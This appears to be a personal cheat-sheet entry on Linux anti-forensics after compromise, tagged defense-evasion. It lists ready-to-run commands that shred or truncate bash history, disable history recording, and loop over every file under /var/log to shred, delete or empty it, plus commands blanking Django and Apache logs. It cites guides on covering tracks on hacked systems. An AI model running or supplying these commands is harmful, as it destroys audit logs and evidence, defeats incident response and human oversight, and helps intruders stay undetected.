---
author(s):
  - Userware
tags:
  - post-exploitation
  - defense-evasion
  - anti-forensics
  - T1070-003
  - T1070-004
  - linux
---
# Living off the Land

## 01 - Command History

Clear history commands

```
$ shred -u <wipesync | wipe | unlink> -zxfvn 5 ~/.bash_history && cat /dev/null > ~/.bash_history && history -cw

$ truncate -s 0 ~/.bash_history

$ dd status=none bs=1k count=$(du -sk ~/.bash_history | cut -f 1) if=/dev/urandom > ~/.bash_history && rm -f ~/.bash_history

$ cat /dev/null > ~/.bash_history && history -cw
```

Disable history option.

```
$ set +o history

$ set -o history

$ shopt -ou history

$ shopt -uo history
```

Wipe the logs

```
# for log in $(find /var/log -type f); do shred -uzxfvn 5 $log; done

# for log in $(find /var/log -type f); do cat /dev/null > $log; done

# for log in $(find /var/log -type f); do rm -f $log; done

# for log in $(find /var/log -type f); do echo '' > $log; done

# for log in $(find /var/log -type f); do > $log; done
```

## 02 - HTTP Webserver

```
$ sudo echo "" > /var/log/django.log

$ sudo echo "" > /var/log/apache2/error_log
```

TODO: Research about `truncate -s 0 file.log`.

---
## References

### Source Repositories

- [hackerschoice: THC's favourite Tips, Tricks & Hacks (Cheat Sheet)](https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet)

### Null Byte

- [Null Byte: Clear the Logs & Bash History on Hacked Linux Systems to Cover Your Tracks & Remain Undetected](https://null-byte.wonderhowto.com/how-to/clear-logs-bash-history-hacked-linux-systems-cover-your-tracks-remain-undetected-0244768/)